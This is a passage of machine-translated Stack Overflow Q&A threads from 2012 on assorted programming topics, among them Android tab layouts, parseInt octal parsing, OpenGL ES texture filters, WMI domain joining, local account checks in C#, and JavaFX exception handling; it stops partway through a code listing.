谁能解释为什么`(@+android:id/realtabcontent , @android:id/tabcontent)`Android Support4Demos 的 FragmentTabs.java 示例中有两个框架布局。

FragmentTabs.java 调用`setContentView(R.layout.fragment_tabs);`方法和下面的布局文件一样。

`fragment_tabs.xml`

```
 <TabHost xmlns:android="http://schemas.android.com/apk/res/android"
        android:id="@android:id/tabhost"
        android:layout_width="match_parent"
        android:layout_height="match_parent" >

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:orientation="vertical" >

            <TabWidget
                android:id="@android:id/tabs"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:layout_weight="0"
                android:orientation="horizontal" />

            <FrameLayout
                android:id="@android:id/tabcontent"
                android:layout_width="0dp"
                android:layout_height="0dp"
                android:layout_weight="0" />

            <FrameLayout
                android:id="@+android:id/realtabcontent"
                android:layout_width="match_parent"
                android:layout_height="0dp"
                android:layout_weight="1" />
        </LinearLayout>

    </TabHost> 
```

提前致谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T18:35:26.353

在浏览完示例后，我发现以下评论`FragmentsTabs.java`

```
 /**
 * This is a helper class that implements a generic mechanism for
 * associating fragments with the tabs in a tab host. It relies on a trick.
 * Normally a tab host has a simple API for supplying a View or Intent that
 * each tab will show. This is not sufficient for switching between
 * fragments. So instead we make the content part of the tab host 0dp high
 * (it is not shown) and the TabManager supplies its own dummy view to show
 * as the tab content. It listens to changes in tabs, and takes care of
 * switch to the correct fragment shown in a separate content area whenever
 * the selected tab changes.
 */ 
```

# assembly - 如何在解析器中避免大量 if-else 语句

> ID：12318809
> 
> 赞同：3
> 
> 时间：2012-09-07T13:10:31.167
> 
> 标签：assembly

我是汇编程序设计领域的新手。我正在为机器设计自己的组装器。目前，我的汇编器获取第一个标记（假设它是一条指令），然后尝试生成相应的目标代码。现在我需要将令牌与助记词池进行匹配，然后生成相应的 obj 代码。问题是我目前使用 if-else 构造，即

```
if(strcmp(mnemonic_read, "mov")==0)
// generate code for mov instr
else if(strcmp(mnemonic_read,"cmp")==0)
// generate code for cmp 
```

我可以在不使用大量 if-else 语句的情况下完成所有这些操作吗？我可以通过`mnemonic_read`字符串变量调用函数吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:13:59.683

您应该使用一种哈希表，而不是几十个 if-else-statements 甚至是 switch-construct。

还要确保将您的“汇编器逻辑”与简单的解析器逻辑分开。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T14:58:42.213

这是一个常见的问题，有一个共同的解决方案（哈罗德建议）。

您可能想要研究 lex / yacc 或 flex / bison，它们在 *nix 环境中运行良好。Antlr 做了类似的事情，但使用的是 Java。

例如，您可以使用 lex（来自[http://dinosaur.compilertools.net/](http://dinosaur.compilertools.net/)）：

> Lex 源是正则表达式和相应程序片段的表。该表被转换为一个程序，该程序读取输入流，将其复制到输出流并将输入划分为与给定表达式匹配的字符串。当每个这样的字符串被识别时，相应的程序片段就会被执行。

因此，在 lex 中，您可以指定标记（由正则表达式匹配）以及要生成的相应代码。您还可以将标记输入 yacc（另一个编译器编译器），您可以使用它为您的新语言生成编译器。

这是一个有用的示例指南： http: [//ds9a.nl/lex-yacc/cvs/lex-yacc-howto.html](http://ds9a.nl/lex-yacc/cvs/lex-yacc-howto.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-05T11:49:35.210

您可能需要某种哈希映射的[关联数组](http://en.wikipedia.org/wiki/Associative_array)来存储您的关键字。这基本上是一个由任何类型索引的数组（对您的问题有用的是一个字符串），它包含的值可能是一个函数指针。然后，您将为每个解析的命令调用不同的函数。

假设您正在使用代码片段中的 C++，您可以编写

```
// map strings to function pointers 
// which take a string (maybe the operands) as parameter
map<string, void (*)(string)> commands; 
```

在构造函数或类似的初始化例程中，您需要设置哈希映射（基本上充当跳转表）：

```
init() {        
    commands["mov"] = cmd_mov;  
    commands["cmp"] = cmd_cmp;
    ...  
}

void cmd_mov(string operands) {
    // generate move instruction
}
void cmd_cmp(string operands) {
    // generate cmp instruction
} 
```

您只需通过以下方式调用该函数

```
string mnemonic = mnemonic_read_cmd();
string operands = mnemonic_read_op();
*(commands[mnemonic])(operands); 
```

如果每个函数需要不同数量的参数，那么[functionoid](http://yosefk.com/c++fqa/function.html#fqa-33.10)或`boost::function`可能是正确的选择，而不是简单的函数指针。

# c# - ZeroMQ 上下文破坏导致轮询 ETERM 但不会继续

> ID：12318819
> 
> 赞同：2
> 
> 时间：2012-09-07T13:11:22.570
> 
> 标签：c#, dispose, zeromq

我有一个非常简单的线程循环

```
public void ClientLoop(object AContext)
{
    var context = (ZMQ.Context) AContext;

    Socket client = CreateServerSocket(context);

    while (true)
    {
        try
        {
            Context.Poller(requestTimeout*1000, client);
        }
        catch (Exception e)
        {
            if (e.Errno == ETERM)
            {
                //Catch a termination error. 
                Debug.WriteLine("Terminated! 1");
                return;
            }
        }
    }
} 
```

以及如下所示的处置

```
public void Dispose()
{
    _context.Dispose();
} 
```

创建客户端套接字时将 linger 设置为零，并且在处理程序集中有一个轮询器。该套接字也是一个请求套接字。

一旦 dispose 被调用，poller excepts 就会进入 try except 块。然而，处置后并没有像我想象的那样继续。这就是 ZGuide 所说的处理上下文和套接字破坏的方式，但是在这种情况下它似乎不起作用。

我错过了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-09T01:40:50.057

> 然而，处置后并没有像我想象的那样继续。

你的意思是调用 Dispose 挂起/阻塞？那是因为您在从线程返回之前没有关闭客户端套接字。（我下面的语法可能是错误的，但你明白了）

```
 if (e.Errno == ETERM)
        {
            //Catch a termination error. 
            Debug.WriteLine("Terminated! 1");
            client.Close();
            return;
        } 
```

将 linger 设置为 0 是不够的 - 这只是防止套接字关闭阻塞。您仍然必须关闭工作线程中的套接字以防止 _context.Dispose() 阻塞。

> 这就是 ZGuide 所说的处理上下文和套接字破坏的方式......

嗯 - 这是真的，但文档中有一个重要的限定符：

> 我们将在下一章中讨论多线程，但是因为你们中的一些人会在你可以安全行走之前尝试运行，尽管有警告，所以下面是在多线程 ØMQ 应用程序中干净退出的快速而肮脏的指南。

在文档的后面，他们描述了如何通过在每个线程中都有一个专用套接字来侦听终止信号来进行干净关闭。考虑通过做类似的事情来增强你的工作线程。这样，您可以通过向每个线程发送消息来请求每个线程自行关闭 - 然后每个线程退出其运行循环，对其套接字进行干净关闭并退出。一旦所有线程都退出，您就可以安全地处理上下文而不会出现任何错误。

# matlab - 数组中无法解释的额外条目

> ID：12318828
> 
> 赞同：0
> 
> 时间：2012-09-07T13:12:18.123
> 
> 标签：matlab

在我今天运行的教程中，出现了几次以下问题。

代码是这样的

```
x = [ x0 + v*cosd(theta) * t, y0 + v*sind(theta) * t + .5 *g * t^2] 
```

但是，当您输出 x 时，它在两个计算值之前有 3 个条目为零。我不知道那是怎么发生的。我完全重新设计了相同的代码，这个问题就消失了。这可能是 MATLAB 的某种错误吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T14:44:42.627

在 matlab 中，如果将向量与标量组合，则结果值为向量。例如：

```
a = 1;
b = [1, 2];
c = a+b; % returns [2, 3]; 
```

因此，让我们分解您的方程式：

```
 x = [ x0 + v*cosd(theta) * t, y0 + v*sind(theta) * t + .5 *g * t^2] 
```

进入：

```
A = x0 + v*cosd(theta) * t;
B = y0 + v*sind(theta) * t + .5 *g * t^2;
x = [ A, B]; 
```

`A`并且`B`必须都是标量`x`才能成为`1x2`。您的结果是 1x3，因为您的变量之一`A`是`B`1x2。这是`x0`, `v`, `theta`, `t`,`y0`或`g`不是标量而是`1x2`向量的结果。

我怀疑`g`,`x0`或`y0`, 是罪魁祸首，因为这些变量对于单个方程来说是唯一的。所以我首先检查这些值的大小。但是，在不知道变量值的情况下，我无法确定。

# editor - 如何在 AjaXplorer 中获取 zoho 编辑器？

> ID：12318829
> 
> 赞同：0
> 
> 时间：2012-09-07T13:12:21.617
> 
> 标签：editor, zoho, pydio

我在使用 zoho 编辑器时遇到了一个简单的问题。我需要能够使用 ajaxplorer zoho 文本编辑器打开任何文件类型（例如：.docx 文件）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-10T12:46:38.037

我得到了答案..只需在设置/插件/编辑器/zoho 编辑器中启用“是”...;-)

# javascript - parseInt("08") 返回 0

> ID：12318830
> 
> 赞同：18
> 
> 时间：2012-09-07T13:12:22.403
> 
> 标签：javascript, parsing, integer

> **可能重复：**
> [JavaScript parseInt 八进制错误的解决方法](https://stackoverflow.com/questions/850341/workarounds-for-javascript-parseint-octal-bug)

我一直在研究一个 javascript 函数，通过声明年、月和日期来设置日期对象。但是，当月份的值为`08`或时`09`，`0`使用 时会返回`parseInt()`。见下文：

```
parseInt("01") //returns 1
parseInt("02") //returns 2
parseInt("03") //returns 3
parseInt("04") //returns 4
parseInt("05") //returns 5
parseInt("06") //returns 6
parseInt("07") //returns 7
parseInt("08") //returns 0?
parseInt("09") //returns 0?
parseInt("10") //returns 10 
```

我创建了一个 jsFiddle 来演示这个问题：

[http://jsfiddle.net/GhkEf/](http://jsfiddle.net/GhkEf/)

为什么`parseInt("08")`要`parseInt("09")`返回`0`？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-09-07T13:13:04.410

这是因为以 0 开头的数字被认为是八进制的。08 是八进制的错误数字。

改为使用`parseInt('09', 10);`。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-07T13:13:24.393

它被解析为八进制数。使用 中的`radix`参数`parseInt`。

`parseInt('08', 10);`

更新：从 ES5 开始，浏览器不应该**有**这个错误。八进制文字需要采用`0o12`被视为八进制数的形式。`08`现在在 ES5 中默认被认为是十进制数，然而，所有浏览器可能还不支持这个，所以你应该继续将`radix`参数传递给`parseInt`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T13:14:09.840

您可以通过包含基数来解决此问题，例如：

```
parseInt("08", 10); // outputs 8 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-07T13:14:20.947

您需要添加十个基数：

```
parseInt("08", 10); 
```

一些实现默认为八进制。

# ios - 为什么 GL_LINEAR_MIPMAP_LINEAR 会给出 INVALID_ENUM 错误？

> ID：12318833
> 
> 赞同：9
> 
> 时间：2012-09-07T13:12:29.073
> 
> 标签：ios, opengl-es

使用 XCode 4.4.1 我有以下 OpenGL 代码：

```
//set the tex params
glTexParameteri(GL_TEXTURE_2D, GL_GENERATE_MIPMAP, GL_TRUE);
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR_MIPMAP_LINEAR); 
```

我使用以下代码段检查 OpenGL 错误：

```
GLenum err = glGetError();//THIS IS LIKE THIS BECAUSE OF AN EARLIER ERROR

if (err != GL_NO_ERROR)
{
    NSLog(@"glError: 0x%04X", i, err);
} 
```

OpenGL 代码产生错误 (0x500) - 我的目标是带有 OpenGL ES2.0 的 iOS 5.0。

为什么这是一个无效的枚举？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-09-07T13:19:57.533

放大过滤器[`GL_TEXTURE_MAG_FILTER`](http://www.khronos.org/opengles/sdk/docs/man/xhtml/glTexParameter.xml)不支持 mip-mapping，因为这对纹理放大没有任何意义。它只支持`GL_NEAREST`和`GL_LINEAR`。所以只需将此行更改为

```
glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR); 
```

# java - Eclipse 中的 JBoss v4.2，获取配置解析异常

> ID：12318837
> 
> 赞同：0
> 
> 时间：2012-09-07T13:13:00.893
> 
> 标签：java, eclipse, jboss

我正在尝试在 Eclipse 中启动我的 JBoss v4.2 服务器，但遇到了一些异常。[这是日志](http://codepad.org/mYQCT13K)。任何线索可能是什么问题？日志列出的唯一文件是该`jboss-service.xml`文件，我看不出有任何问题。

所以，问题是我的`java.security`文件指向一个`nss.cfg`包含 ~ 的文件，如下所示：

`nssLibraryDirectory = C:\PROGRA~2\Java\jdk1.6.0_32/bin`

我可以将其更改为`C:\Program Files (x86)\Java\jdk1.6.0_32/bin`，但它也不喜欢括号。所以我必须找到某种方法来链接到该文件夹​​，而无需任何括号或波浪号。

暂时解决了我的问题。我将 bin 文件夹复制到没有任何特殊字符 ( `C:\javabin`) 的文件夹中。一个有*希望*的临时解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:19:21.887

此处描述了该错误：

```
Caused by: sun.security.pkcs11.ConfigurationException: Unexpected value Token['~'], line 2
    at sun.security.pkcs11.Config.excToken(Config.java:339) 
```

看来需要用 XML 代码来表示了~

你能发布XML配置吗？

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-09-07T13:29:27.733

[使用带有CDATA](http://en.wikipedia.org/wiki/CDATA)标记的 XML 生成文件（带有**freemarker**）将正确转义这些字符。

它必须工作。我知道它在第一次时可能很重，但是您将在每个服务器实现中执行一次，并根据需要尽可能多地运行它，例如 jboss 4.2.2 GA ...

XML 编码也很好，但是在那之后您的 XML 文件就不是真正的人类可读的了。

要考虑生成的文件，您可以采用默认值`jboss-service.xml`并将其构建为模板`jboss-service.ftl`，并且您可以在需要配置更新时生成它。

我认为您也可以使用 freemarker 使用该方法即时编码 XML 字符，`to_xml("name",object)`并查看[Build-ins for Nodes (XML)](http://freemarker.org/docs/ref_builtins_node.html) ...如果您选择这些方式。

# c++ - C++中的实体系统

> ID：12318840
> 
> 赞同：3
> 
> 时间：2012-09-07T13:13:07.940
> 
> 标签：c++, architecture, entity-system, component-based

我最近发现了实体系统架构，我在 C++ 中遇到了一些困难/理解实现。

## 我如何看待实体系统：

**组件**：具有属性、设置和获取的类。

1.  雪碧
2.  实体
3.  飞船
4.  ...

**System**：具有组件列表的类。

1.  项目清单
2.  实体管理器
3.  渲染器
4.  输入
5.  相机
6.  ...

**实体**：只是一个带有组件列表的空类。

## 我做了什么：

目前，我有一个允许我这样做的程序：

```
// Create a new entity/
Entity* entity = game.createEntity();

// Add some components.
entity->addComponent( new TransformableComponent() )
            ->setPosition( 15, 50 )
            ->setRotation( 90 )
        ->addComponent( new PhysicComponent() )
            ->setMass( 70 )
        ->addComponent( new SpriteComponent() )
            ->setTexture( "name.png" )
            ->addToSystem( new RendererSystem() ); 
```

如果我正确理解了 EntitySystem，那么每个 System 都有自己的组件列表，可以在其中工作。（组件列表或实体列表，这就是问题）

```
class Component;

/////////////////////////////////////////////////
/// \brief  An abstract system. (Interface)
///
/////////////////////////////////////////////////
class System
{
public:

    /////////////////////////////////////////////////
    /// \brief Call when process is created.
    ///
    /////////////////////////////////////////////////
    virtual bool start() = 0;

    /////////////////////////////////////////////////
    /// \brief Call when process is updated.
    ///
    /////////////////////////////////////////////////   
    virtual void update() = 0;

    /////////////////////////////////////////////////
    /// \brief Call when process is removed.
    ///
    /////////////////////////////////////////////////
    virtual void end() = 0;

    /////////////////////////////////////////////////
    /// \brief Call when process is removed.
    ///
    /////////////////////////////////////////////////
    virtual void addComponent( Component* component )
    {
        elements.push_back( component );
    }

protected:

    std::vector<Component*> elements;

}; 
```

（我把代码放在 .h 中只是为了快速调试 ^^）

## 问题

我想在带有 X 组件列表的系统中添加一个“T”组件

我试过的：

```
std::vector<Component*> elements; 
```

但我想要这样的东西：

```
std::vector<T*> elements; 
```

我的 System 类是抽象的。我的系统儿童班需要有这个列表，它是自己的类型。

## 解决方案 ：

我试图让我的 System 类有一个模板类，所以我只需要这样做：class Renderer：System

但我的 SystemManager 不喜欢这段代码：`std::vector<System> systems`。

**具有 T 类型的系统类：**

```
template<class T>
class System
{
public:

    /////////////////////////////////////////////////
    /// \brief Call when process is created.
    ///
    /////////////////////////////////////////////////
    virtual bool start() = 0;

    /////////////////////////////////////////////////
    /// \brief Call when process is updated.
    ///
    /////////////////////////////////////////////////   
    virtual void update() = 0;

    /////////////////////////////////////////////////
    /// \brief Call when process is removed.
    ///
    /////////////////////////////////////////////////
    virtual void end() = 0;

    /////////////////////////////////////////////////
    /// \brief Call when process is removed.
    ///
    /////////////////////////////////////////////////
    virtual void addComponent( T* component )
    {
        elements.push_back( component );
    }

protected:

    std::vector<T*> elements;

}; 
```

系统管理器代码：

```
class System;

class SystemManager
{
public:

    /////////////////////////////////////////////////
    /// \brief Default constructor.
    ///
    /////////////////////////////////////////////////
    SystemManager();

    /////////////////////////////////////////////////
    /// \brief Call when system is created.
    /// \param system A system to add.
    ///
    /////////////////////////////////////////////////
    bool addSystem( System* system);

    /////////////////////////////////////////////////
    /// \brief Call when system is updated.
    ///
    /////////////////////////////////////////////////
    void update();

    /////////////////////////////////////////////////
    /// \brief Call when system is removed.
    /// \param system A system to remove.
    ///
    /////////////////////////////////////////////////
    void removeSystem( System* system );

private:

    std::vector<System*> systemList;

}; 
```

有了这个，我的 SystemManager 中出现了这个错误： *“将'System'重新定义为不同类型的符号”* （指向 SystemManager 中的“class System”行）

你有解决这个问题的方法吗？我的 EntitySystem 方法好吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T15:07:26.033

In your code System is a template, later in the System manager class you try to use System as if it were not a template. This will not work. You need to either specify the type, make system manager a template and pass the type parameter through to system, or not have system be a template. Also forward declaring templates, as a non template no less, isn't going to work. Take a step back and figure out how templates work in C++.

Further more [http://gamedev.stackexchange.com](http://gamedev.stackexchange.com) has many questions and answers about entity component designs, you might find it useful.

# c# - 使用 C# 以编程方式将机器添加到域时出现奇怪的错误代码

> ID：12318847
> 
> 赞同：0
> 
> 时间：2012-09-07T13:13:29.843
> 
> 标签：c#, wmi

我正在尝试使用 C# 以编程方式将 Windows 机器（服务器 2008 R2）添加到域中。我知道我有将机器添加到域的正确权限，因为我可以通过 Windows UI 手动添加它。我也知道我的 ManagementScope 是正确的，因为当我创建它时，我能够查询我想要的任何 WMI 对象。我正在尝试按如下方式连接：

```
ManagementClass computerSystem = new ManagementClass(scope, new ManagementPath("Win32_ComputerSystem"), new ObjectGetOptions());
ManagementObjectCollection computerSystemInstances = computerSystem.GetInstances();
ManagementObject baseObject = computerSystemInstances.ToList<ManagementObject>().First();

ManagementBaseObject inParams = baseObject.GetMethodParameters("JoinDomainOrWorkgroup");
inParams["Name"] = "my.domain.com";
inParams["Password"] = domainCredentials.FullUserName;
inParams["UserName"] = domainCredentials.Password;
inParams["FJoinOptions"] = 1;

var joinParams = baseObject.InvokeMethod("JoinDomainOrWorkgroup", inParams, null); 
```

方法调用不会引发任何异常，但发现的错误代码值为`joinParams.Properties["ReturnValue"].Value`1312。我在任何地方都找不到任何文档（即使在 Microsoft 的 MSDN 页面上也找不到该方法的任何文档）说明此错误代码的含义。有谁知道在哪里可以找到此错误代码的用途？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:16:17.187

在您的代码中，您将用户名和密码转换为错误的变量。这可能是什么原因？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:18:50.947

这可能是系统错误代码，发现[http://msdn.microsoft.com/en-us/library/ms681385%28v=vs.85%29](http://msdn.microsoft.com/en-us/library/ms681385%28v=vs.85%29)

```
ERROR_NO_SUCH_LOGON_SESSION
1312 (0x520)
A specified logon session does not exist. It may already have been terminated. 
```

# c++ - 在复合模式中搜索特定元素

> ID：12318849
> 
> 赞同：1
> 
> 时间：2012-09-07T13:13:47.780
> 
> 标签：c++, oop, design-patterns, iterator, composite

假设我有一个简单的复合模式结构：

*   抽象类`User`

*   叶类`PersonalUser`

*   `GroupUser`以`std::vector<User*> users`容器为成员变量的复合类

以及如果在容器中找到用户（自然由其他或对象组成）则`bool GroupUser::findUser(User* u)`返回的方法`true``u``users``PersonalUser``GroupUser`

现在，我当然想递归地定义该函数，所以我需要遍历向量中的每个`User`，`users`并与 进行比较`u`，但我不知道是否`User`是 a`PersonalUser`或`GroupUser`，所以我的问题是：

*我是否必须定义一个虚拟函数`char User::returnType()`来告诉我`User`它是哪种类型，或者是否有更好/更智能的方法可以沿着树向下寻找`User`？*

ps 当然有一种方法`bool areEqual(User*, User*)`，我们可以通过它来比较用户:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T13:27:26.193

您可以将 FindUser 成员函数作为虚拟添加到抽象类 User 中，如果正在搜索的用户是当前用户（个人或组），则使其返回 true。

在 GroupUser 中，如果要搜索的用户不是当前的 GroupUser，您可以覆盖 FindUser 并将任何调用委托给所有包含的用户。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T13:55:41.537

正如MadKeithV所说，你在接口中声明虚函数findUser(User*u)，那么：

```
bool
    User::findUser(User*u) {
        return u == this;
    } 
```

和

```
GroupUser::findUser(User *u) {
    for (// loop on your users)
        if (currentUser.findUser(u))
            return true;
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T13:22:54.293

您可以使用 eg`dynamic_cast<>()`来检查 a`User*`是否真的是 a `GroupUser`，如下所示：

```
GroupUser* groupUser = dynamic_cast<GroupUser*>(userPointer); 
```

如果它返回一个空指针，则`userPointer`不是`GroupUser`.

# android - 在 phonegap 中将目录列为文件树

> ID：12318853
> 
> 赞同：1
> 
> 时间：2012-09-07T13:14:00.837
> 
> 标签：android, cordova, jqmobi

我正在使用 Android+PhoneGap+JQM 开发一个项目，其中我需要列出保存在 SDCARD 中的所有音频文件，就像文件树一样，其中将列出根目录的所有子文件夹，当我单击任何将列出子文件夹子文件夹和音频文件（如果有）等等。[我尝试了http://labs.abeautifulsite.net/archived/jquery-fileTree/demo/](http://labs.abeautifulsite.net/archived/jquery-fileTree/demo/)中提到的 jquery 文件树，但它对我不起作用。

# c# - 如果用户帐户处于活动状态，如何签入 C#

> ID：12318857
> 
> 赞同：6
> 
> 时间：2012-09-07T13:14:17.753
> 
> 标签：c#, ldap

如何从 C# 检查本地用户帐户（即本地管理员帐户）是否处于活动状态？

我真正想要的是“net user Administrator”命令的“Account Active”=“Yes”（或“No”）输出的 C# 替代品。

恐怕这个问题看起来与这个问题重复[，](https://stackoverflow.com/questions/591681/using-c-how-do-you-check-if-a-computer-account-is-disabled-in-active-directory "使用 C#，如何检查活动目录中是否禁用了计算机帐户？")但我不知道为根 DirectoryEntry 对象的参数传递什么。尝试了不同的东西，如“ldap://”+ Environment.MachineName、“ldap://127.0.0.1”、“WinNT://”+ Environment.MachineName，但都没有奏效。在所有三种情况下，我都收到 searcher.FindAll() 调用引发的异常。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T14:44:29.053

```
class Program
{
    static void Main(string[] args)
    {

        // Create the context for the principal object. 
        PrincipalContext ctx = new PrincipalContext(ContextType.Machine);

        UserPrincipal u = UserPrincipal.FindByIdentity(ctx, IdentityType.SamAccountName, "Administrator");
        Console.WriteLine(String.Format("Administrator is enable: {0}", u.Enabled));

    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:34:15.060

您可以查询 WMI 的`Win32_UserAccount`

这是 MS 的*wmi 代码创建者*作为参考吐出的样板；

```
using System;
using System.Management;
using System.Windows.Forms;

namespace WMISample
{
    public class MyWMIQuery
    {
        public static void Main()
        {
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT Disabled FROM Win32_UserAccount WHERE name = 'alexk'");

                foreach (ManagementObject queryObj in searcher.Get())
                {
                    Console.WriteLine("-----------------------------------");
                    Console.WriteLine("Win32_UserAccount instance");
                    Console.WriteLine("-----------------------------------");
                    Console.WriteLine("Disabled: {0}", queryObj["Disabled"]);
                    Console.ReadKey();
                }
            }
            catch (ManagementException e)
            {
                MessageBox.Show("An error occurred while querying for WMI data: " + e.Message);
            }
        }
    }
} 
```

（我会链接该工具，但像往常一样，msdn 链接已失效）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T13:40:03.363

试试这个。

```
 var server = "YOURMACHINENAME";
 var username = "Guest"; 
 var de = new DirectoryEntry {Path = "WinNT://" + server + ",computer"};
 var result = de.Children
     .Cast<DirectoryEntry>()
     .First<DirectoryEntry>(d => d.SchemaClassName == "User" && d.Properties["Name"].Value.ToString() == username);

 var flags = (int)result.Properties["UserFlags"].Value;
 var disabled = (flags & 2) == 2; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T13:36:38.643

[这](https://stackoverflow.com/questions/234845/change-local-administrator-password-in-c-sharp)不完全相同，但他们使用`DirectoryEntry directoryEntry = new DirectoryEntry(string.Format("WinNT://{0}/{1}", computerName, username));` 会有帮助吗？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-07T13:44:46.477

考虑到它是本地用户，你需要调用win32 api[函数NetGetUserInfo](http://pinvoke.net/default.aspx/netapi32.NetUserGetInfo)来获取你需要的东西。

pinvoke.net 中的示例几乎是您所需要的，但是您需要将 level 参数更改为 2 以获取必要的[信息](http://msdn.microsoft.com/en-us/library/windows/desktop/aa371337%28v=vs.85%29.aspx)

# c# - 如何在 c# 中获取 propertygrid 项目的名称、标签和值？

> ID：12318859
> 
> 赞同：2
> 
> 时间：2012-09-07T13:14:33.903
> 
> 标签：c#, propertygrid

我在 propertygrid 中定义项目。我的代码在这里：

```
[DisplayName("Title of book"), CategoryAttribute("Books")]
public string BookName{ get; set; } 
```

使用此代码，我可以从 propertygrid 获取该项目的标签和价值（对于此示例：*书名*及其价值（例如）*学习 C#*）：

```
private void button1_Click(object sender, EventArgs e)
{
    GridItem gi = propertyGrid1.SelectedGridItem;
    while (gi.Parent != null)
    {
        gi = gi.Parent;
    }
    foreach (GridItem item in gi.GridItems)
    {
        ParseGridItems(item); //recursive
    }
}

private void ParseGridItems(GridItem gi)
{
    if (gi.GridItemType == GridItemType.Category)
    {
        foreach (GridItem item in gi.GridItems)
        {
            ParseGridItems(item);
        }
    }
    textBox1.Text += "Lable : "+gi.Label + "\r\n";
    if(gi.Value != null)
        textBox1.Text += "Value : " + gi.Value.ToString() + "\r\n";
} 
```

我怎样才能得到项目名称？对于这个例子：*书名*

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:27:51.180

使用[`GridItem.PropertyDescriptor`](http://msdn.microsoft.com/en-us/library/system.windows.forms.griditem.propertydescriptor.aspx)属性：

```
var propertyName = propertyGrid1.SelectedGridItem.PropertyDescriptor.Name; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-19T15:34:01.687

如果继承 PropertyGrid 控件，则可以获取所有条目。在继承的类中，放置这个新属性：

```
public GridItem[] Items
    {
        get
        {
            try
            {
                System.Reflection.FieldInfo field_gridView = typeof(PropertyGrid).GetField("gridView", System.Reflection.BindingFlags.NonPublic
                    | System.Reflection.BindingFlags.Instance);

                object gridView = field_gridView.GetValue(this);

                System.Reflection.MethodInfo gridView_method_GetAllGridEntries = gridView.GetType().GetMethod("GetAllGridEntries", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance, null, new Type[0], null);

                object gridEntries_collection = gridView_method_GetAllGridEntries.Invoke(gridView, new object[0]);

                System.Reflection.MethodInfo gridEntries_collection_count_method = gridEntries_collection.GetType().GetMethod("get_Count");

                int count_entries = (int) gridEntries_collection_count_method.Invoke(gridEntries_collection, new object[0]);

                System.Reflection.MethodInfo gridEntries_collection_getItem_method = gridEntries_collection.GetType().GetMethod("get_Item", new Type[] { typeof(int) });

                GridItem[] entries = new GridItem[count_entries];

                for (int i = 0; i < count_entries; i++)
                {
                    entries[i] = gridEntries_collection_getItem_method.Invoke(gridEntries_collection, new object[] { i }) as GridItem;
                }

                return entries;
            }
            catch
            {
                throw;
            }
        }
    } 
```

希望对你有帮助，安本。

# java - JavaFX 2 - 捕获所有运行时异常

> ID：12318861
> 
> 赞同：12
> 
> 时间：2012-09-07T13:14:46.427
> 
> 标签：java, exception-handling, javafx-2

我试过了

```
Thread.setDefaultUncaughtExceptionHandler... 
```

在 main 和 start(Stage primaryStage) 方法中。它不工作。
我也试过

```
public static void main(String[] args) {
 try {
  launch(args);
 }catch(Throwable t) {
  System.out.println(t.getMessage);
 }
} 
```

异常堆栈跟踪。

> 在 javafx.concurrent.Task$TaskCallable$2.run(Task.java:1251) 在 com.sun.javafx.application.PlatformImpl$3.run(PlatformImpl.java:141) 在 com.sun.glass.ui.gtk.GtkApplication ._runLoop(Native Method) at com.sun.glass.ui.gtk.GtkApplication$1$1.run(GtkApplication.java:56) at java.lang.Thread.run(Thread.java:662)

感谢您的帮助。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-10-09T10:46:44.210

如果您检查代码`Platform.runLater()`（见下文），您将看到异常被吞没（第 146 / 147 行），因此默认的未捕获异常处理程序将无法捕获它们 - 基于那段代码，我不'认为除了在可运行文件中包含 try/catch 块外，您别无选择。

请注意，[此问题已报告](http://javafx-jira.kenai.com/browse/RT-15332?page=com.atlassian.jira.plugin.system.issuetabpanels%3Aall-tabpanel#issue-tabs)（需要登录 - 注册是免费的）并且应该在 Lombard 中修复（= Java FX 8.0 将于明年与 Java 8 一起发布）。

您也可以创建一个实用方法并调用

```
Platform.runLater(getFxWrapper(yourRunnable));

public static Runnable getFxWrapper(final Runnable r) {
    return new Runnable() {

        @Override
        public void run() {
            try {
                r.run();
            } catch (Exception e) {
                //here you probably want to log something
                System.out.println("Found an exception");
            }
        }
    };
} 
```

[代码`Platform.runLater`](http://hg.openjdk.java.net/openjfx/2.2/graphics/rt/file/b26bab84097d/javafx-ui-common/src/com/sun/javafx/application/PlatformImpl.java)：

```
 120     private static void runLater(final Runnable r, boolean exiting) {
  121         if (!initialized.get()) {
  122             throw new IllegalStateException("Toolkit not initialized");
  123         }
  124 
